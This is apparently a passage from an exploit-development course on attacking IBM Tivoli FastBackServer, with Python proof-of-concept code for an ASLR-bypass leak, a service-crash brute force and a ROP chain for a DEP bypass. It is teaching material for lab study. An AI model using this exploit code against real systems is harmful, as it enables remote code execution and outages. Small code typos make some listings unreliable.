Let's verify our findings by opening a command prompt with administrative permissions on the Windows 10 student machine and using the netstat command to list the TCP connections. We'll supply the -anbp flag to show only TCP connections.
C:\Windows\system32> netstat -anbp tcp

Active Connections

  Proto  Local Address          Foreign Address        State
...
  TCP    192.168.120.10:11406  0.0.0.0:0              LISTENING
 [FastBackServer.exe]
  TCP    192.168.120.10:11460  0.0.0.0:0              LISTENING
 [FastBackServer.exe]
  TCP    192.168.120.10:11460  192.168.119.120:53280  CLOSE_WAIT
 [FastBackServer.exe]
...
Listing 28 - From the output we find the existing TCP connection
Listing 28 shows that our Kali machine at 192.168.119.120 has an active TCP connection to the Windows 10 client on port 53280, confirming the information we found in WinDbg. This is promising, as we are hoping to receive the output of FXCLI_DebugDispatch through a network packet, and the most logical way to do this from the application perspective is to reuse the TCP connection we created to send our request.
Let's continue verifying our hypothesis by attempting to locate a function that transmits data.
After the code providing the IP address and TCP port number, there are a series of checks on the values retrieved by FX_AGENT_S_GetConnectedIpPort. After reaching the basic block shown in Figure 24, we locate the function FXCLI_IF_Buffer_Send.
 
Figure 24: Call to FXCLI_IF_Buffer_Send
This function name suggests that some data will be sent over the network. Combined with the check for an active connection to our Kali machine, we can guess that the data supplied to this function will be sent to us as a network packet.
Let's continue our dynamic analysis by single-stepping until the call to FXCLI_IF_Buffer_Send. Then we'll dump the contents of the first function argument.
eax=00ede3a8 ebx=0608c418 ecx=04fd0020 edx=0000009e esi=0608c418 edi=00669360
eip=00575d2d esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x9877:
00575d2d e8817d0000      call    FastBackServer!FXCLI_IF_Buffer_Send (0057dab3)

0:077> da poi(esp)
00ede3a8  "XpressServer: SymbolOperation .-"
00ede3c8  "------------------------------ ."
00ede3e8  "Value of [WriteProcessMemory] is"
00ede408  ": ..Address is: 0x75342890 .Flag"
00ede428  "s are: 0x207 .Size is : 0x20 ."
Listing 29 - Output from FXCLI_DebugDispatch as an argument
The text string containing the address of WriteProcessMemory that was returned by FXCLI_DebugDispatch is supplied as an argument to FXCLI_IF_Buffer_Send.
To confirm data transmission, we could go into the call in search of a call to send. However, it's much easier to instead modify our proof of concept.
We can update our proof of concept to receive data after sending a request packet as shown in Listing 30.
def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)

	response = s.recv(1024)
	print(response)

	s.close()

	print("[+] Packet sent")
	sys.exit(0)
Listing 30 - Proof of concept receiving data
Listing 30 shows that the proof of concept will print any data received through the recv method to the console.
To confirm our hypothesis, we'll remove all the breakpoints in WinDbg, let the execution continue, and run the updated proof of concept.
kali@kali:~$ python3 poc.py 192.168.120.10
b'\x00\x00\x00\x9eXpressServer: SymbolOperation \n------------------------------- \nValue of [WriteProcessMemory] is: \n\nAddress is: 0x75342890 \nFlags are: 0x207 \nSize is : 0x20 \n'
[+] Packet sent
Listing 31 - Receiving FXCLI_DebugDispatch output
Listing 31 shows that we have received the output from FXCLI_DebugDispatch, which includes the address for WriteProcessMemory. At this point we have implemented a rudimentary ASLR bypass. Excellent!
Finally, we'll filter the data to only print the address. We can do this by searching for the string "Address is:", as shown in Listing 32.
def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
       if line.find(pattern) != -1:
          address = int((line.split(pattern)[-1].strip()),16)
    if not address:
       print("[-] Could not find the address in the Response")
       sys.exit()
    return address
Listing 32 - Updated proof of concept to filter the address
To make the code more readable and modular, we placed the parsing code inside a separate function called parseResponse.
Inside this method, we locate the address by splitting the response by newlines and searching for the "Address is:" string.
Once the string is found, our code extracts the address and converts it to hexadecimal.
Finally, we'll call parseResponse from the main method, supply the response packet as an argument, and print the results to the console.
kali@kali:~$ python3 poc.py 192.168.120.10
0x75342890
[+] Packet sent
Listing 33 - Results from running the updated proof of concept
Listing 33 shows that we received the clean address of WriteProcessMemory.
Occasionally, when running our proof of concept, we fail to resolve the address of WriteProcessMemory. This is why the parseResponse method checks for a populated address variable. If our proof of concept fails, as it does in Listing 34, we can rerun it until it succeeds.
kali@kali:~$ python3 poc.py 192.168.120.10
[-] Could not find the address in the Response
Listing 34 - Failed to resolve address of WriteProcessMemory
In this section, we have leveraged a logical vulnerability into an ASLR bypass.
An ASLR bypass like the one we found may be combined with a memory corruption vulnerability to obtain code execution by overcoming both ASLR and DEP. We'll explore these steps in the next section.
Exercises
1.	Repeat the analysis to trace our packet after the call to SymGetSymFromName.
2.	Update the proof of concept to obtain the address of WriteProcessMemory.
3.	Execute the exploit without WinDbg attached. Can you still bypass ASLR?
1 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winsock2/nf-winsock2-connect
2 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/winsock/sockaddr-2
3 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
10.3. Expanding our Exploit (ASLR Bypass)
In previous sections, we managed to locate a suspicious Win32 API imported by FastBackServer that led to an information disclosure. This leak provides a direct ASLR bypass by resolving and returning the address of any exported function.
When we resolved the address of WriteProcessMemory, it also gave us a pointer to kernel32.dll, meaning we could use that DLL to locate ROP gadgets. Unfortunately, since every monthly update changes the ROP gadget offsets, our exploit would become dependent on the patch level of Windows.
We can create a better exploit by leaking the address of a function from one of the IBM modules shipped with FastBackServer, meaning our exploit will only be dependent on the version of Tivoli.
In the next sections, we will locate a pointer to an IBM module that we can use for ROP gadgets to bypass DEP. As part of the exploit development process, we will also overcome various complications we will encounter.
10.3.1. Leaking an IBM Module
In order to proceed, we must first select a good candidate IBM module for our gadgets. To do this, we'll determine the name of the loaded modules as well as their location on the filesystem. Once we decide which module to use, we will leak the address of an exported function using the logical vulnerability. Finally, using the leaked address, we'll gather the base address of the IBM module in order to build our ROP chain dynamically.
Let's start by enumerating all loaded IBM modules in the process. We can do this in WinDbg by first breaking execution and then using the lm command along with the f flag to list the file paths.
0:077> lm f
start    end        module name
00190000 001cd000   SNFS     C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.dll
001d0000 001fd000   libcclog C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll
00400000 00c0c000   FastBackServer C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
00c10000 00c47000   CSNCDAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL
00c50000 00c82000   CSMTPAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL
01060000 010d7000   CSFTPAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL
010e0000 01113000   snclientapi C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll
013f0000 01432000   NLS      C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll
01550000 0157b000   gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
015c0000 015fa000   icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
03240000 03330000   libeay32IBM019 C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
...
Listing 35 - Loaded IBM modules for FastBackServer
The output in Listing 35 reveals ten IBM DLLs and the FastBackserver executable.
Next, we need to select a module with an exported function we can resolve that contains desirable gadgets. We must ensure it does not contain 0x00 in the uppermost byte of the base address, which excludes the use of FastBackServer.exe.
Multiple modules meet these requirements, so we'll start by arbitrarily choosing libeay32IBM019.dll, located in C:\Program Files\ibm\gsk8\lib\N\icc\osslib.
Next, we need to locate the function we want to resolve. Let's copy libeay32IBM019.dll to our Kali Linux machine and load it into IDA Pro.
Once IDA Pro has completed its analysis, we can navigate to the Export tab and pick any function that does not contain a bad character.
 
Figure 25: N98E_CRYPTO_get_net_lockid is exported by libeay32IBM019
In our case, we'll use the N98E_CRYPTO_get_net_lockid function, which can be found as the first entry when sorting by Address in IDA Pro (Figure 25).
This function is located at offset 0x14E0 inside the module. Once we leak the function address, we'll need to subtract that offset to get the base address of the DLL.
Listing 36 displays an updated proof of concept that implements this logic.
# psCommandBuffer
symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00"
buf += symbol + b"A" * (100 - len(symbol))
buf += b"B" * 0x100
buf += b"C" * 0x100

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)

	response = s.recv(1024)
	FuncAddr = parseResponse(response)
	libeay32IBM019Base = FuncAddr - 0x14E0
	print(str(hex(libeay32IBM019Base)))

	s.close()

	print("[+] Packet sent")
	sys.exit(0)

if __name__ == "__main__":
 	main()
Listing 36 - Proof of concept to leak the base address of libeay32IBM019B
We can test our updated exploit by continuing execution within WinDbg and launching our proof of concept. Our exploit's results are shown below.
kali@kali:~$ python3 poc.py 192.168.120.10                                         
0x03240000                                                                             
[+] Packet sent  
Listing 37 - Leaking the base address of libeay32IBM019
We have successfully leaked the base address of the IBM module. Very nice!
Next, we need to locate gadgets within it that we can use for a ROP chain to bypass DEP. Bad characters can be problematic at this point, so we'll deal with these in the next section.
Exercises
1.	Implement a proof of concept to leak the base address of libeay32IBM019.
2.	Modify the proof of concept to leak the base address of a different IBM module.
3.	Use rp++ to generate a file containing gadgets.
4.	Modify the proof of concept to be more modular with a separate function (leakFuncAddr) for leaking the address of a given symbol. Use that to leak the address of both WriteProcessMemory and libeay32IBM019.
10.3.2. Is That a Bad Character?
Our current exploit leverages a logical vulnerability to disclose the address of an IBM module's exported function, as well as the module's base address. Before moving forward with our exploit development, we must ensure that the selected module's base address does not contain bad characters.
In a previous module, we exploited a memory corruption vulnerability triggered through opcode 0x534 in FastBackServer. We determined during exploit development that the characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20 break our exploit by truncating the buffer.
The vulnerability is present due to unsanitized input to the scanf call. Since we will be leveraging that vulnerability again, we need to avoid the same bad characters in our updated exploit.
Keeping this in mind, we can start by checking for bad characters in the base address of the selected module. We can do this by executing the ASLR disclosure multiple times across application restarts and inspecting the upper two bytes of the module base address.
After multiple tests, we observe that there is a small risk that the base address of libeay32IBM019 will contain a bad character due to ASLR randomization.
One such occurrence is illustrated in Listing 38.
kali@kali:~$ python3 poc.py 192.168.120.10
0x3200000
[+] Packet sent
Listing 38 - Finding bad characters in base address of libeay32IBM019
In the listing above, the second-to-highest byte contains the value 0x20, which is a bad character.
If we use this base address to set up a ROP chain, along with the relevant gadget offsets, the bad character will truncate the buffer and the exploit attempt will fail. We must pick a different module, or risk a denial-of-service condition while trying to leverage the vulnerability. In our case, we may have another option.
To provide greater reliability, some server-side enterprise suites run a service that monitors its applications, and can take action if one of them crashes. If the service detects a crash, it will restart the process, ensuring that the application remains accessible.
When the process restarts, ASLR will randomize the base address of the module. This provides an opportunity for the attacker, as there is a chance that the new randomized address is clean. Since we can typically "restart" the application an arbitrary number of times, we can effectively perform a brute force attack until we encounter a good address.
The associated services for Tivoli are shown in Figure 26.
 
Figure 26: Four services for Tivoli
The FastBack WatchDog service seems promising as its name suggests some sort of process monitoring.
To verify this, we'll use Process Monitor1 (ProcMon), which, among other things, can monitor process creation. We'll open ProcMon.exe as an administrator from C:\Tools\SysInternalsSuite and navigate to Filter > Filter... to open the process monitor filter window.
Let's set up a filter rule by selecting Operation in the first column and contains in the second column. We'll enter "Process" as the term to include, as shown in Figure 27. With this search we are filtering entries such as "Process Start", "Process Exit", etc.
 
Figure 27: Process Monitor filter
Once the rule is configured, we'll Add it, Apply it, and enable it with OK.
Next, we can observe what happens when FastBackServer crashes. We'll simulate a crash by attaching WinDbg to the process and then closing WinDbg. Eventually, FastBackServer is restarted, as shown in Figure 28.
 
Figure 28: FastBackServer is being restarted automatically
Once the process restarts, we'll resend the packet that calls FXCLI_DebugDispatch and observe the new base address, which does not contain the bad character.
kali@kali:~$ python3 poc.py 192.168.120.10
0x31f0000
[+] Packet sent
Listing 39 - Bad characters in base address of libeay32IBM019 are gone
Excellent! We can get a clean base address for libeay32IBM019 by repeatedly crashing FastBackServer, abusing its automatic restart.
After FastBackServer crashes, the new instance may not be ready to accept network connections for several minutes.
At this point, we've bypassed ASLR and dealt with the issue of bad characters. Next, we'll combine these skills and leverage a DEP bypass to obtain code execution.
Exercises
1.	Repeat the analysis to identify the automatic process restart.
2.	Implement a proof of concept that will leak the base address of libeay32IBM019 and identify any bad characters.
3.	In the case of bad characters, implement a routine that crashes FastBackServer (using the buffer overflow vulnerability triggered with opcode 0x534) and detects when the service is back online.
4.	Automate the process of brute forcing the bad characters to obtain a clean base address that works with the exploit.
1 (Microsoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
10.4. Bypassing DEP with WriteProcessMemory
Now that ASLR is taken care of, we need to bypass DEP. In a previous module, we did this by modifying the memory protections of the stack where the shellcode resides.
Earlier, we used VirtualAlloc to bypass DEP. That technique still applies, but we will expand our ROP skills by taking a different approach.
We can copy our shellcode from the stack into a pre-allocated module's code page through the Win32 WriteProcessMemory1 API.
In our case, we'll copy our shellcode into the code page of libeay32IBM019. The code page is already executable, so we won't violate DEP when the shellcode is executed from there.
A typical code page is not writable, but WriteProcessMemory takes care of this by making the target memory page writable before the copy, then reverting the memory protections after the copy.
In the next sections we'll unpack the API's required arguments and create a ROP chain that calls it.
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
10.4.1. WriteProcessMemory
Our current goal is to abuse WriteProcessMemory to bypass DEP and gain code execution inside the code section of libeay32IBM019. However, before we create a ROP chain to call WriteProcessMemory, we need to understand what arguments it accepts.
In Listing 40, we find the function prototype from MSDN.
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
Listing 40 - WriteProcessMemory function prototype
The first argument, hProcess, is a handle to the process we want to interact with. Since we want to perform a copy operation inside the current process, we'll supply a pseudo handle. The pseudo handle is a special constant currently set to -1.1 When the API is invoked, it translates the pseudo handle to the actual process handle and allows us to effectively ignore this argument.
The second argument, lpBaseAddress, is the absolute memory address inside the code section where we want our shellcode to be copied. In principle, this address could be anywhere inside the code section because it has the correct memory protections, but overwriting existing code could cause the application to crash.
To avoid crashing the application, we need to locate unused memory inside the code section and copy our shellcode there. When the code for an application is compiled, the code page of the resulting binary must be page-aligned. If the compiled opcodes do not exactly fill the last used page, it will be padded with null bytes.
Exploit developers refer to this padded area as a code cave. The easiest way to find a code cave is to search for null bytes at the end of a code section's upper bounds. Let's begin our search by navigating the PE header2 to locate the start of the code pages.
We'll use WinDbg to find the code cave, so let's attach it to FastBackServer and pause execution.
As we learned in a previous module, we can find the offset to the PE header by dumping the DWORD at offset 0x3C from the MZ header. Next, we'll add 0x2C to the offset to find the offset to the code section, as shown in Listing 41.
0:077> dd libeay32IBM019 + 3c L1
031f003c  00000108

0:077> dd libeay32IBM019 + 108 + 2c L1
031f0134  00001000

0:077> ? libeay32IBM019 + 1000
Evaluate expression: 52367360 = 031f1000
Listing 41 - Starting address of libeay32IBM019 code page
Let's use the !address command to collect information about the code section.
0:077> !address 031f1000

Usage:                  Image
Base Address:           031f1000
End Address:            03283000
Region Size:            00092000 ( 584.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        031f0000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
...
Listing 42 - Upper bounds of code section
As highlighted in Listing 42, we've obtained the upper bound of the code section. To locate a code cave, we can subtract a sufficiently-large value from the upper bound to find unused memory large enough to contain our shellcode.
Instead of parsing the PE header manually, we can use the !dh3 WinDbg command to display all the headers.
To check if a code cave is indeed present, let's subtract the arbitrary value 0x400, which should be large enough for our shellcode, from the upper bound:
0:077> dd 03283000-400
03282c00  00000000 00000000 00000000 00000000
03282c10  00000000 00000000 00000000 00000000
03282c20  00000000 00000000 00000000 00000000
03282c30  00000000 00000000 00000000 00000000
03282c40  00000000 00000000 00000000 00000000
03282c50  00000000 00000000 00000000 00000000
03282c60  00000000 00000000 00000000 00000000
03282c70  00000000 00000000 00000000 00000000

0:077> ? 03283000-400 - libeay32IBM019
Evaluate expression: 601088 = 00092c00

0:077> !address 03282c00

Usage:                  Image
Base Address:           031f1000
End Address:            03283000
Region Size:            00092000 ( 584.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        031f0000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
Listing 43 - Code cave at offset 0x92c00
Listing 43 reveals that we have found a code cave that provides 0x400 bytes of memory. In addition, the memory protection is PAGE_EXECUTE_READ, as expected.
The code cave starts at offset 0x92c00 into the module. This offset contains a null byte, so we'll use the offset 0x92c04 instead.
Summarizing the information we gathered so far, we can use offset 0x92c04 together with the leaked module base address as the second argument (lpBaseAddress) to WriteProcessMemory.
The final three arguments for WriteProcessMemory are simpler. Let's review the function prototype, provided again below.
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
Listing 44 - WriteProcessMemory function prototype
Because of the stack overflow, our shellcode will be located on the stack after we trigger the vulnerability. Therefore, for the third API argument, we must supply the shellcode's stack address. The fourth argument will be the shellcode size.
The last argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it's easier to use an address inside the data section of libeay32IBM019, as we do not have to gather it at runtime.
We can use the !dh4 command to find the data section's start address, supplying the -a flag to dump the name of the module along with all header information.
0:077> !dh -a libeay32IBM019

File Type: DLL
FILE HEADER VALUES
     14C machine (i386)
       6 number of sections
49EC08E6 time date stamp Sun Apr 19 22:32:22 2009

       0 file pointer to symbol table
       0 number of symbols
      E0 size of optional header
    2102 characteristics
            Executable
            32 bit word machine
            DLL
...

SECTION HEADER #4
   .data name
    F018 virtual size
   D5000 virtual address
    CA00 size of raw data
   D2000 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
C0000040 flags
         Initialized Data
         (no align specified)
         Read Write
...
Listing 45 - Enumerating header information
From Listing 45, we learn that the offset to the data section is 0xD5000, and its size is 0xF018.
We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let's dump the contents of the address just past the size value.
0:077> ? libeay32IBM019 + d5000 + f018  + 4
Evaluate expression: 53297180 = 032d401c

0:077> dd 032d401c
032d401c  00000000 00000000 00000000 00000000
032d402c  00000000 00000000 00000000 00000000
032d403c  00000000 00000000 00000000 00000000
032d404c  00000000 00000000 00000000 00000000
032d405c  00000000 00000000 00000000 00000000
032d406c  00000000 00000000 00000000 00000000
032d407c  00000000 00000000 00000000 00000000
032d408c  00000000 00000000 00000000 00000000

0:077> !vprot 032d401c
BaseAddress:       032d4000
AllocationBase:    031f0000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              01000000  MEM_IMAGE

0:077> ? 032d401c - libeay32IBM019
Evaluate expression: 933916 = 000e401c
Listing 46 - Locating offset to unused DWORD in data section
Listing 46 shows that we found a writable, unused DWORD inside the data section, which is exactly what we need. It is located at offset 0xe401c from the base address.
Now that we know what arguments to supply to WriteProcessMemory, let's implement a call to this API using ROP.
First, we need to reintroduce the code we previously used to trigger the buffer overflow vulnerability in the scanf call (opcode 0x534) into our proof of concept.
Second, we'll insert a ROP skeleton consisting of the API address, return address, and arguments to use WriteProcessMemory instead of VirtualAlloc. In the previous FastBackServer exploit, we used absolute addresses for ROP gadgets, but in this case (because of ASLR), we'll identify every gadget as libeay32IBM019's base address plus an offset.
Listing 47 lists the code required to create a ROP skeleton for WriteProcessMemory.
...
libeay32IBM019Func = leakFuncAddr(b"N98E_CRYPTO_get_new_lockid", server)
dllBase = libeay32IBM019Func - 0x14E0
print(str(hex(dllBase)))

# Get address of WriteProcessMemory
WPMAddr = leakFuncAddr(b"WriteProcessMemory", server)
print(str(hex(WPMAddr)))

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x700)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
wpm  = pack("<L", (WPMAddr))    		    # WriteProcessMemory Address
wpm += pack("<L", (dllBase + 0x92c04)) 	# Shellcode Return Address
wpm += pack("<L", (0xFFFFFFFF)) 		      # pseudo Process handle
wpm += pack("<L", (dllBase + 0x92c04)) 	# Code cave address 
wpm += pack("<L", (0x41414141)) 		      # dummy lpBuffer (Stack address) 
wpm += pack("<L", (0x42424242)) 		      # dummy nSize
wpm += pack("<L", (dllBase + 0xe401c)) 	# lpNumberOfBytesWritten
wpm += b"A" * 0x10

offset = b"A" * (276 - len(wpm))
...
Listing 47 - ROP skeleton to call WriteProcessMemory
As covered in an earlier exercise, we'll first gather the base address of libeay32IBM019, which we'll store in the dllBase variable.
Previously, when we used VirtualAlloc without an ASLR bypass, we had to generate and update all the function arguments (including the return and API addresses) at runtime with ROP.
This case is different. Our ASLR bypass resolves the address of WriteProcessMemory along with the code cave address, which is both the return address and the destination address for our shellcode. The last argument, lpNumberOfBytesWritten, is also calculated as an address inside the data section without the help of a ROP gadget.
As a result, we only need to dynamically update two values with ROP. We'll update the address of the shellcode on the stack (because it changes each time we execute the exploit) and the size of the shellcode, avoiding NULL bytes.
We should note that the 276-byte offset from the start of the buffer (used to overwrite EIP) has not changed from the previous module exploit.
We'll begin updating these values dynamically by focusing on the shellcode's dummy value on the stack. Repeating an earlier technique, we'll obtain a copy of ESP in a different register, align it with the dummy value on the stack, and overwrite it.
An excellent candidate is shown in Listing 48.
0x100408d6: push esp ; pop esi ; ret 
Listing 48 - Gadget to obtain a copy of ESP
We can use this gadget to cleanly obtain a copy of ESP in ESI.
From the output of rp++ shown above, we notice that the address of the gadget is 0x100408d6. This address is an absolute address, not an offset. Because of ASLR, we cannot directly use this address, so we'll need to calculate the offset.
When we execute rp++, it parses the DLL's PE header to obtain the preferred base load address. This address will be written as the gadget address in the output file. We'll use WinDbg to find the preferred base load address for libeay32IBM019.dll, and subtract the value of that address from each gadget we select in our output file.
The preferred base load address is called the ImageBase in the PE header and is stored at offset 0x34.
0:077> dd libeay32IBM019 + 3c L1
031f003c  00000108

0:077> dd libeay32IBM019 + 108 + 34 L1
031f013c  10000000
Listing 49 - Finding the preferred base load address
In the case of libeay32IBM019.dll, this turns out to be 0x10000000 as shown in Listing 49.
The preferred base load address of libeay32IBM019.dll matches the upper most byte in the gadget addresses given in the rp++ output. To obtain the offset, we can simply ignore the upper 0x100 value.
We are now ready to create the first part of the ROP chain that replaces the dummy stack address with the shellcode address. We can use a similar approach we used in a previous module but with gadgets from libeay32IBM019.dll.
The first step is to align the EAX register with the shellcode address on the stack.
eip = pack("<L", (dllBase + 0x408d6)) # push esp ; pop esi ; ret

# Patching lpBuffer
rop = pack("<L", (dllBase + 0x296f))    # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))         # junk into esi
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (0x88888888))
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (0x77777878))
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
Listing 50 - ROP chain to align EAX with the shellcode
Listing 50 shows that the gadget we use to overwrite EIP will copy the stack pointer into ESI. Next, we'll get the stack address from ESI into EAX and increase it, pointing it to the shellcode address on the stack.
The EAX alignment shown in Listing 50 reuses a technique from a previous module in which we subtract a small value from EAX by, paradoxically, adding a large value in order to avoid NULL bytes.
In the next step, we update the lpBuffer dummy argument. The gadget we'll use to patch the dummy argument uses the "MOV [EAX], ECX" instruction, so we must move the address of the shellcode into ECX first. We also need to obtain the stack address where the lpBuffer argument should be patched in EAX. A ROP chain to perform this is shown in Listing 51.
rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242))         # junk into esi
rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret 
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0x42424242))         # junk for ret 0x10
rop += pack("<L", (0xfffffee0))         # pop into eax
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x1fd8))   # mov [eax], ecx ; ret
Listing 51 - ROP chain to patch lpNumberOfBytesWritten
As highlighted in the ROP chain above, the first gadget uses a return instruction with an offset of 0x10. As a result, execution will return to the "POP EAX" gadget's address on the stack, and the stack pointer is then increased by 0x10. Because of this we need to insert 0x10 junk bytes before the value (0xfffffee0) that is popped into EAX.
Next, our ROP chain pops the value 0xfffffee0 into EAX and adds the contents of ECX to it. 0xfffffee0 corresponds to -0x120, which is the correct value to align EAX with the lpBuffer placeholder (shellcode pointer) on the stack. Finally, the last gadget overwrites the lpBuffer argument with the real shellcode address.
To test this, let's restart FastBackServer and attach WinDbg. If we place a breakpoint on the gadget that writes the real shellcode address on the stack (libeay32IBM019+0x1fd8), we can step over the mov instruction and display the updated ROP skeleton on the stack.
0:078> bp libeay32IBM019+0x1fd8
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 

0:078> g
Breakpoint 0 hit
eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360
eip=03111fd8 esp=0dbbe364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
03111fd8 8908            mov     dword ptr [eax],ecx  ds:0023:0dbbe2fc=41414141

0:063> p
eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360
eip=03111fda esp=0dbbe364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
03111fda c3              ret

0:063> dd eax-10 L7
0dbbe2ec  75f42890 031a2c04 ffffffff 031a2c04
0dbbe2fc  0dbbe41c 42424242 031f401c

0:063> dd 0dbbe41c L8
0dbbe41c  44444444 44444444 44444444 44444444
0dbbe42c  44444444 44444444 44444444 44444444
Listing 52 - ROP skeleton as seen on the stack
With the shellcode address correctly patched, our ROP skeleton on the stack is almost complete. Next, we need to overwrite the dummy shellcode size, which in the listing above is represented by 0x42424242.
As with prior ROP chains, we should reuse as many gadgets as possible when we need to repeat similar actions.
The shellcode size does not have to be precise. If it is too large, additional stack content will simply be copied as well. Most 32-bit Metasploit-generated shellcodes are smaller than 500 bytes, so we can use an arbitrary size value of -524 (0xfffffdf4) and then negate it to make it positive.
Listing 53 shows the ROP chain for this step.
# Patching nSize
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0x408dd)) # push eax ; pop esi ; ret 
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret 
rop +? pack("<L", (0xfffffdf4)) 	# -524
rop += pack("<L", (dllBase + 0x1d8c2)) # neg eax ; ret
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
Listing 53 - Patching nSize with ROP
In the above ROP chain we first increase EAX (which points to lpBuffer on the stack) by four to align it with the nSize dummy argument.
Next, we save the updated EAX pointer by copying it to ESI. We do this because with our available gadgets, there's no simple way to obtain the shellcode size in ECX. Instead, we'll use EAX for this arithmetic and then copy the result to ECX.
For the last copy operation, we'll use a gadget that both copies the content of EAX into ECX and restores EAX from ESI. We have already encountered this gadget in the previous step. It contains a return instruction with an offset of 0x10, which we need to account for in the ROP chain (0x10 junk bytes).
